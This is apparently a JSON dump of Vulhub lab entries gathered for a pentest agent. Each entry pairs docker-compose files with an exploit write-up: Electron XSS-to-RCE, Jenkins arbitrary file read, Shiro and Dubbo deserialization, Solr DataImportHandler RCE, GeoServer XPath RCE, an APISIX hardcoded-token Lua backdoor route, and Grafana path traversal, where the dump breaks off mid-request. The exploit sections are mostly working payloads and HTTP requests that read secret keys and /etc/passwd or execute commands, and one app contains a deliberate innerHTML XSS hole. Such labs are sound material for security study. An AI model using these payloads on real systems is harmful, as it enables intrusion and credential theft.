    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/docker-entrypoint.sh\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/build/.gitignore\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/src/index.html\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/src/main.js\n- /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/src/package.json\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 306 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n electron:\n   image: vulhub/electron:wine\n   command: bash /docker-entrypoint.sh\n   volumes:\n    - ./src:/project\n    - ./build:/build\n    - ./docker-entrypoint.sh:/docker-entrypoint.sh\n web:\n   image: nginx:1\n   volumes:\n    - ./build:/usr/share/nginx/html\n   ports:\n    - \"8080:80\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/docker-entrypoint.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 219 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\n\nset -ex \n\ncd /project && npm install && npm run build-${PLATFORM:=win64}\n\ntar -zcvf /build/cve-2018-15685.tar.gz /build/cve-2018-15685-* --exclude /build/cve-2018-15685.tar.gz\nrm -rf /build/cve-2018-15685-*\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/build/.gitignore\n\n- Extension: \n- Language: unknown\n- Size: 8 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n*.tar.gz\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/src/index.html\n\n- Extension: .html\n- Language: html\n- Size: 578 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset=\"UTF-8\">\n    <title>Hello World!</title>\n  </head>\n  <body>\n    <h1>Hello World!</h1>\n    <p>This window does not have access to node bindings.</p>\n    <pre>process: <script>document.write(process)</script></pre>\n\n    <p id=\"content\">output...</p>\n    <p>\n      <label>input your script: </label>\n      <textarea rows=\"5\" cols=\"20\" id=\"script\"></textarea>\n\n      <input type=\"button\" onclick=\"document.getElementById('content').innerHTML = document.getElementById('script').value\" value=\"Submit\">\n    </p>\n    \n  </body>\n</html>\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/src/main.js\n\n- Extension: .js\n- Language: javascript\n- Size: 1867 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```javascript\n// Modules to control application life and create native browser window\nconst {app, BrowserWindow} = require('electron')\n\n// Keep a global reference of the window object, if you don't, the window will\n// be closed automatically when the JavaScript object is garbage collected.\nlet mainWindow\n\nfunction createWindow () {\n  // Create the browser window.\n  mainWindow = new BrowserWindow(\n    {\n      width: 800, \n      height: 600,\n      \"webPreferences\": {\n        \"nodeIntegration\": false,\n        \"nativeWindowOpen\": true\n      }\n    }\n  );\n\n  // and load the index.html of the app.\n  mainWindow.loadFile('index.html');// this could be remote content\n\n  // Open the DevTools.\n  // mainWindow.webContents.openDevTools()\n\n  // Emitted when the window is closed.\n  mainWindow.on('closed', function () {\n    // Dereference the window object, usually you would store windows\n    // in an array if your app supports multi windows, this is the time\n    // when you should delete the corresponding element.\n    mainWindow = null\n  })\n}\n\n// This method will be called when Electron has finished\n// initialization and is ready to create browser windows.\n// Some APIs can only be used after this event occurs.\napp.on('ready', createWindow)\n\n// Quit when all windows are closed.\napp.on('window-all-closed', function () {\n  // On OS X it is common for applications and their menu bar\n  // to stay active until the user quits explicitly with Cmd + Q\n  if (process.platform !== 'darwin') {\n    app.quit()\n  }\n})\n\napp.on('activate', function () {\n  // On OS X it's common to re-create a window in the app when the\n  // dock icon is clicked and there are no other windows open.\n  if (mainWindow === null) {\n    createWindow()\n  }\n})\n\n// In this file you can include the rest of your app's specific main process\n// code. You can also put them in separate files and require them here.\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/electron/CVE-2018-15685/src/package.json\n\n- Extension: .json\n- Language: json\n- Size: 768 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```json\n{\n  \"name\": \"cve-2018-15685\",\n  \"version\": \"0.0.1\",\n  \"main\": \"main.js\",\n  \"scripts\": {\n    \"build-win32\": \"electron-packager . cve-2018-15685 --platform=win32 --arch=ia32 --electronVersion=2.0.7 --appVersion=0.0.1 --out=/build --overwrite\",\n    \"build-win64\": \"electron-packager . cve-2018-15685 --platform=win32 --arch=x64 --electronVersion=2.0.7 --appVersion=0.0.1 --out=/build --overwrite\",\n    \"build-mac\": \"electron-packager . cve-2018-15685 --platform=darwin --arch=x64 --electronVersion=2.0.7 --appVersion=0.0.1 --out=/build --overwrite\",\n    \"build-linux\": \"electron-packager . cve-2018-15685 --platform=linux --arch=x64 --electronVersion=2.0.7 --appVersion=0.0.1 --out=/build --overwrite\"\n  },\n  \"devDependencies\": {\n    \"electron-packager\": \"^12.0.2\"\n  }\n}\n\n```\n\n",
    "readme": "# Electron WebPreferences Remote Code Execution Vulnerability（CVE-2018-15685）\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nElectron is an open source library developed by GitHub for building cross-platform desktop applications with HTML, CSS, and JavaScript. Electron accomplishes this by combining Chromium and Node.js into a single runtime and apps can be packaged for Mac, Windows, and Linux.\n\nWhen Electron sets `nodeIntegration=false` (default), the JavaScript in the page cannot access the built-in library of node.js. CVE-2018-15685 bypass this limitation, enabling arbitrary commands to be executed if the user can execute JavaScript (such as when accessing a third-party page or an XSS vulnerability exists in the app).\n\nReference links:\n\n- https://electronjs.org/blog/web-preferences-fix\n- https://www.contrastsecurity.com/security-influencers/cve-2018-15685\n\n## Compile application\n\nExecute the following command to compile an  vulnerability application:\n\n```\ndocker compose run -e PLATFORM=win64 --rm electron\n```\n\nThe value of `PLATFORM` is the operating system on which the application is running. The options are:`win64`、`win32`、`mac`、`linux`。\n\nAfter the compilation completed, execute the following command to run the web service:\n\n```\ndocker compose run --rm -p 8080:80 web\n```\n\nNow，access`http://your-ip:8080/cve-2018-15685.tar.gz`to download application.\n\n## expliot\n\nOpen the app:\n\n![](1.png)\n\nClick submit, the content in the input box will be displayed in the app, and there is obviously an XSS vulnerability.\n\nWe submit `<img src=1 onerror=\"require('child_process').exec('calc.exe')\">` and find that nothing happens, because `nodeIntegration=false`.\n\nAt this time, submit the POC (Windows):\n\n```\n<img src=1 onerror=\"window.open().open('data:text/html,<script>require(\\'child_process\\').exec(\\'calc.exe\\')</script>');\">\n```\n\nAs you see, calc.exe shows up.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2024-23897.md",
    "filenamenomd": "CVE-2024-23897",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jenkins/CVE-2024-23897/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jenkins/CVE-2024-23897/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 189 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2.2'\nservices:\n  jenkins:\n    image: vulhub/jenkins:2.441\n    ports:\n      - \"50000:50000\"\n      - \"8080:8080\"\n      - \"5005:5005\"\n    init: true\n    environment:\n      - DEBUG=1\n\n```\n\n",
    "readme": "# Jenkins Arbitrary File Read Through the CLI (CVE-2024-23897)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nJenkins is an open source automation server.\n\nJenkins uses the [args4j library](https://github.com/kohsuke/args4j) to parse command arguments and options on the Jenkins controller when processing CLI commands. This command parser has a feature that replaces an `@` character followed by a file path in an argument with the file’s contents (expandAtFiles), which leads attackers to read arbitrary files from Jenkins server.\n\nThis vulnerability affects Jenkins prior to 2.441.\n\nReferences:\n\n- <https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314>\n- <https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw>\n\n## Vulnerable Environment\n\nExecute following command to start a Jenkins server 2.441:\n\n```\ndocker compose up -d\n```\n\nYou can access the Jenkins server through `http://your-ip:8080/` after the server is started. Default administrator's username and password are `admin` and `vulhub`.\n\n## Exploit\n\nFirst, you should download the command-line client `jenkins-cli.jar` by `http://localhost:8080/jnlpJars/jenkins-cli.jar`.\n\nRead the file `/proc/self/environ` to get the Jenkins base directory, `JENKINS_HOME=/var/jenkins_home`:\n\n```\njava -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 \"@/proc/self/environ\"\n```\n\n![](1.png)\n\nThen, you can use it to retrieve sensitive files such as `secrets.key` or `master.key` (anonymously, only the first line of the file can be read via an error on the command line):\n\n```\njava -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 \"@/var/jenkins_home/secret.key\"\n```\n\n![](2.png)\n\n```\njava -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 \"@/var/jenkins_home/secrets/master.key\"\n```\n\n![](3.png)\n\nBecause the \"Allow anonymous read access\" is turned on, you can also read the full content of a file:\n\n```\njava -jar jenkins-cli.jar -s http://localhost:8080/ -http connect-node \"@/etc/passwd\"\n```\n\n![](4.png)\n"
  },
  {
    "filename": "CVE-2016-4437.md",
    "filenamenomd": "CVE-2016-4437",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/shiro/CVE-2016-4437/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/shiro/CVE-2016-4437/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 72 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/shiro:1.2.4\n   ports:\n    - \"8080:8080\"\n```\n\n",
    "readme": "# Apache Shiro 1.2.4 Deserialization Remote Code Execution (CVE-2016-4437)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management.\n\nIn Apache Shiro 1.2.4 and earlier versions, encrypted user information is serialized and stored in a cookie named \"remember-me\". Attackers can forge user cookies using Shiro's default key, triggering a Java deserialization vulnerability that allows arbitrary command execution on the target machine.\n\n## Environment Setup\n\nExecute the following command to start a Web application using Apache Shiro 1.2.4:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:8080` and you can log in using the credentials `admin:vulhub`.\n\n## Vulnerability Reproduction\n\nUse ysoserial to generate a CommonsBeanutils1 Gadget:\n\n```\njava -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 \"touch /tmp/success\" > poc.ser\n```\n\nEncrypt the payload using Shiro's built-in default key:\n\n```java\npackage org.vulhub.shirodemo;\n\nimport org.apache.shiro.crypto.AesCipherService;\nimport org.apache.shiro.codec.CodecSupport;\nimport org.apache.shiro.util.ByteSource;\nimport org.apache.shiro.codec.Base64;\nimport org.apache.shiro.io.DefaultSerializer;\n\nimport java.nio.file.FileSystems;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class TestRemember {\n    public static void main(String[] args) throws Exception {\n        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(\"/path\", \"to\", \"poc.ser\"));\n\n        AesCipherService aes = new AesCipherService();\n        byte[] key = Base64.decode(CodecSupport.toBytes(\"kPH+bIxk5D2deZiIxcaaaA==\"));\n\n        ByteSource ciphertext = aes.encrypt(payloads, key);\n        System.out.printf(ciphertext.toString());\n    }\n}\n```\n\nThen send the following request with the payload in the rememberMe cookie:\n\n```\nGET / HTTP/1.1\nHost: your-ip:8080\nCookie: rememberMe=<encrypted_payload>\n\n\n```\n\nYou will see the `touch /tmp/success` command has been executed:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2019-0193.md",
    "filenamenomd": "CVE-2019-0193",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/solr/CVE-2019-0193/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/solr/CVE-2019-0193/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 91 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n solr:\n   image: vulhub/solr:8.1.1\n   ports:\n    - \"8983:8983\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Apache Solr Remote Command Execution (CVE-2019-0193)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Solr is an open-source search server. It is written in Java and built upon Apache Lucene. This vulnerability exists in Apache Solr's DataImportHandler, which is an optional but commonly used module for extracting data from databases and other sources. The vulnerability arises because all DIH configurations can be set through the dataConfig parameter in external requests. Since DIH configurations can contain scripts, attackers can execute remote commands by constructing malicious requests.\n\nReferences:\n\n- <https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA>\n- <https://paper.seebug.org/1009/>\n\n## Environment Setup\n\nExecute the following command to start an Apache Solr 8.1.1 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, you can access the Apache Solr management interface at `http://your-ip:8983/`. No authentication is required.\n\n## Vulnerability Reproduction\n\nFirst, select the `demo` core from the left sidebar, open the Dataimport panel, enable Debug mode on the right, and enter the following POC:\n\n```\n<dataConfig>\n  <script><![CDATA[\n          function poc(){ java.lang.Runtime.getRuntime().exec(\"touch /tmp/success\");\n          }\n  ]]></script>\n  <document>\n    <entity name=\"sample\"\n            fileName=\".*\"\n            baseDir=\"/\"\n            processor=\"FileListEntityProcessor\"\n            recursive=\"false\"\n            transformer=\"script:poc\" />\n  </document>\n</dataConfig>\n```\n\n![](1.png)\n\nClick \"Execute with this Configuration\" to send the following request:\n\n```\nPOST /solr/demo/dataimport?_=1708782956647&indent=on&wt=json HTTP/1.1\nHost: your-ip:8983\nContent-Length: 613\nAccept: application/json, text/plain, */*\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\nContent-type: application/x-www-form-urlencoded\nOrigin: http://your-ip:8983\nReferer: http://your-ip:8983/solr/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7\nConnection: close\n\ncommand=full-import&verbose=false&clean=false&commit=true&debug=true&core=demo&dataConfig=%3CdataConfig%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22sample%22%0A++++++++++++fileName%3D%22.*%22%0A++++++++++++baseDir%3D%22%2F%22%0A++++++++++++processor%3D%22FileListEntityProcessor%22%0A++++++++++++recursive%3D%22false%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport\n```\n\nExecute `docker compose exec solr ls /tmp` to enter the container, and you can see that `touch /tmp/success` has been successfully executed:\n\n![](2.jpg)\n"
  },
  {
    "filename": "CVE-2019-17564.md",
    "filenamenomd": "CVE-2019-17564",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/dubbo/CVE-2019-17564/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/dubbo/CVE-2019-17564/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 254 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n provider:\n   image: vulhub/dubbo:2.7.3\n   depends_on:\n    - zookeeper\n   ports:\n    - \"8080:8080\"\n   environment: \n    - DUBBO_REGISTRY=zookeeper://zookeeper:2181\n zookeeper:\n   image: zookeeper:3.7.0\n   ports: \n    - \"2181:2181\"\n\n```\n\n",
    "readme": "# Aapche Dubbo Unsafe Java Deserialization (CVE-2019-17564)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Dubbo is a high-performance, java based open source RPC framework.\n\nApache Dubbo supports different protocols, and its HTTP protocol handler is a wrapper of Spring Framework's `org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter`.\n\nA security warning of Spring Framework shows that an unsafe Java deserialization is exist in the `HttpInvokerServiceExporter`, which could lead to a RCE vulnerability:\n\n> WARNING: Be aware of vulnerabilities due to unsafe Java deserialization: Manipulated input streams could lead to unwanted code As a consequence, do not expose HTTP invoker endpoints to untrusted As a consequence, do not expose HTTP invoker endpoints to untrusted clients but rather just between your own services. In general, we strongly recommend any other message format (e.g. JSON) instead.\n\nThis vulnerability affects Apache Dubbo 2.7.4 and earlier, after 2.7.5 Dubbo replace `HttpInvokerServiceExporter` with `com.googlecode.jsonrpc4j.JsonRpcServer`.\n\nReference links.\n\n- https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html\n- https://www.anquanke.com/post/id/198747\n- https://paper.seebug.org/1128/\n\n## Vulnerable Application\n\nStart an Apache Dubbo 2.7.3 Provider by executing the following command.\n\n```\ndocker compose up -d\n```\n\nAfter the service is started, browser ``http://your-ip:8080`` and the server will return an empty 500 error page by default.\n\n## Exploit\n\nIt is important to know the RPC interface name before leveraging this vulnerability.\n\nVulhub is exposing the port 8080 and port 2181, where 2181 is the port of Zookeeper. Download [Zookeeper](https://zookeeper.apache.org/) and use the script **zkCli** to connect to the unauthenticated Zookeeper server:\n\n```\n./zkCli -server target-ip:2181\n```\n\nAfter connecting, it is come with an interactive console, where you can `ls` all nodes, including Dubbo-related configuration.\n\n![](1.png)\n\nGet the RPC interface named `org.vulhub.api.CalcService`. Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a `CommonsCollections6` payload, then send it to `http://your-ip:8080/org.vulhub.api.CalcService` as POST body.\n\n```\njava -jar ysoserial.jar CommonsCollections6 \"touch /tmp/success\" > 1.poc\ncurl -XPOST --data-binary @1.poc http://your-ip:8080/org.vulhub.api.CalcService\n```\n\n![](2.png)\n\nEntering the container, you can see that `touch /tmp/success` has been executed successfully.\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2024-36401.md",
    "filenamenomd": "CVE-2024-36401",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/geoserver/CVE-2024-36401/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/geoserver/CVE-2024-36401/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 109 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '3'\nservices:\n web:\n   image: vulhub/geoserver:2.23.2\n   ports:\n    - \"8080:8080\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# GeoServer Unauthenticated Remote Code Execution in Evaluating Property Name Expressions (CVE-2024-36401)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.\n\nIn the GeoServer version prior to 2.25.1, 2.24.3 and 2.23.5 of GeoServer, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions.\n\nReferences:\n\n- <https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv>\n- <https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w>\n- <https://tttang.com/archive/1771/>\n- <https://github.com/Warxim/CVE-2022-41852>\n\n## Vulnerable environment\n\nExecute following command to start a GeoServer server 2.23.2:\n\n```\ndocker compose up -d\n```\n\nAfter server is started, you will see the default page of GeoServer at `http://your-ip:8080/geoserver`.\n\n## Exploit\n\nIn the official [vulnerability announcement](https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv), you can find the following content:\n\n> No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests.\n\nFor example, I gonna to use `GetPropertyValue` to execute evil xpath expression. refer to [official document](https://github.com/geoserver/geoserver/blob/2.23.2/doc/en/user/source/services/wfs/reference.rst), the GET method POC is:\n\n```\nGET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success1') HTTP/1.1\nHost: your-ip:8080\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36\nConnection: close\nCache-Control: max-age=0\n\n\n```\n\nThe POST method POC is:\n\n```\nPOST /geoserver/wfs HTTP/1.1\nHost: your-ip:8080\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/xml\nContent-Length: 356\n\n<wfs:GetPropertyValue service='WFS' version='2.0.0'\n xmlns:topp='http://www.openplans.org/topp'\n xmlns:fes='http://www.opengis.net/fes/2.0'\n xmlns:wfs='http://www.opengis.net/wfs/2.0'>\n  <wfs:Query typeNames='sf:archsites'/>\n  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')</wfs:valueReference>\n</wfs:GetPropertyValue>\n```\n\nThe familiar `java.lang.ClassCastException` error:\n\n![](1.png)\n\nAs you can see, `touch /tmp/success1` and `touch /tmp/success2` are both executed successfully.\n\n![](2.png)\n\nIt is important to mention that `typeNames` parameter must exist. You can find all the available Types on the web server without login:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2020-13945.md",
    "filenamenomd": "CVE-2020-13945",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/apisix/CVE-2020-13945/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/apisix/CVE-2020-13945/config.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/apisix/CVE-2020-13945/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 506 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: \"2\"\n\nservices:\n  apisix:\n    image: vulhub/apisix:2.11.0\n    volumes:\n      - ./config.yml:/usr/local/apisix/conf/config.yaml:ro\n    depends_on:\n      - etcd\n    ports:\n      - \"9080:9080\"\n      - \"9091:9091\"\n      - \"9443:9443\"\n  etcd:\n    image: bitnami/etcd:3.4.15\n    environment:\n      ETCD_ENABLE_V2: \"true\"\n      ALLOW_NONE_AUTHENTICATION: \"yes\"\n      ETCD_ADVERTISE_CLIENT_URLS: \"http://0.0.0.0:2379\"\n      ETCD_LISTEN_CLIENT_URLS: \"http://0.0.0.0:2379\"\n    ports:\n      - \"2379:2379/tcp\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/apisix/CVE-2020-13945/config.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 1433 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\n#\n# Licensed to the Apache Software Foundation (ASF) under one or more\n# contributor license agreements.  See the NOTICE file distributed with\n# this work for additional information regarding copyright ownership.\n# The ASF licenses this file to You under the Apache License, Version 2.0\n# (the \"License\"); you may not use this file except in compliance with\n# the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\napisix:\n  node_listen: 9080              # APISIX listening port\n  enable_ipv6: false\n\n  allow_admin:                  # http://nginx.org/en/docs/http/ngx_http_access_module.html#allow\n    - 0.0.0.0/0              # We need to restrict ip access rules for security. 0.0.0.0/0 is for test.\n  \n  enable_control: true\n  control:\n    ip: \"0.0.0.0\"\n    port: 9092\n\netcd:\n  host:                           # it's possible to define multiple etcd hosts addresses of the same etcd cluster.\n    - \"http://etcd:2379\"     # multiple etcd address\n  prefix: \"/apisix\"               # apisix configurations prefix\n  timeout: 30                     # 30 seconds\n\n```\n\n",
    "readme": "# Apache APISIX Hardcoded API Token Leads to RCE (CVE-2020-13945)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache APISIX is a dynamic, real-time, high-performance API gateway. Apache APISIX has a default built-in API token `edd1c9f034335f136f87ad84b625c8f1` that can be used to access all the admin API, which leads to the remote LUA code execution through the `script` parameter added in the 2.x version.\n\nReferences:\n\n- https://apisix.apache.org/docs/apisix/getting-started\n- https://github.com/apache/apisix/pull/2244\n- https://seclists.org/oss-sec/2020/q4/187\n\n## Vulnerability Environment\n\nExecute following command to start a Apache APISIX server 2.11.0 (this vulnerability hasn't been fixed until newest version, might be not considered fixing by vendor):\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can see a default 404 page at `http://your-ip:9080`.\n\n## Vulnerability Reproduce\n\nAdd a new evil router rule to the APISIX through admin api with default token:\n\n```\nPOST /apisix/admin/routes HTTP/1.1\nHost: your-ip:9080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nConnection: close\nX-API-KEY: edd1c9f034335f136f87ad84b625c8f1\nContent-Type: application/json\nContent-Length: 406\n\n{\n    \"uri\": \"/attack\",\n\"script\": \"local _M = {} \\n function _M.access(conf, ctx) \\n local os = require('os')\\n local args = assert(ngx.req.get_uri_args()) \\n local f = assert(io.popen(args.cmd, 'r'))\\n local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M\",\n    \"upstream\": {\n        \"type\": \"roundrobin\",\n        \"nodes\": {\n            \"example.com:80\": 1\n        }\n    }\n}\n```\n\n![](1.png)\n\nThen, use this evil router to execute arbitrary commands:\n\n```\nhttp://your-ip:9080/attack?cmd=id\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2021-43798.md",
    "filenamenomd": "CVE-2021-43798",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/grafana/CVE-2021-43798/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/grafana/CVE-2021-43798/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 93 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  web:\n    image: vulhub/grafana:8.2.6\n    ports:\n      - \"3000:3000\"\n\n```\n\n",
    "readme": "# Grafana 8.x Plugin Module File Path Traversal (CVE-2021-43798)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGrafana is a multi-platform open source analytics and interactive visualization web application.\n\nIn December 2021, a Twitter user disclosed a 0day vulnerability, that unauthenticated attackers could use this vulnerability to step up web path and download arbitrary files through a craft url of Grafana 8.x.\n\nReferences:\n\n- https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/\n- https://twitter.com/hacker_/status/1467880514489044993\n- https://nosec.org/home/detail/4914.html\n- https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw\n\n## Vulnerable environment\n\nExecute following command to start a Grafana server 8.2.6:\n\n```\ndocker compose up -d\n```\n\nAfter the server start, you can browse the login page at `http://your-ip:3000`, no credential for this vulnerability.\n\n## Exploit\n\nThe vulnerability is caused by plugin module, which is able to serve the static file inside the plugin folder. But for lock of check, attacker can use `../` to step up from the plugin folder to parent foler and download arbitrary files.\n\nTo exploit the vulnerabilty, you should know a valid plugin id, such as `alertlist`, here are some of common plugin ids:\n\n```\nalertlist\ncloudwatch\ndashlist\nelasticsearch\ngraph\ngraphite\nheatmap\ninfluxdb\nmysql\nopentsdb\npluginlist\npostgres\nprometheus\nstackdriver\ntable\ntext\n```\n\nSend following request to retrieve the `/etc/passwd` (you can replace the `alertlist` with any valid plugin id):\n\n```\nGET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1\nHost: 192.168.1.112:3000\nAccept-Encoding: gzip, 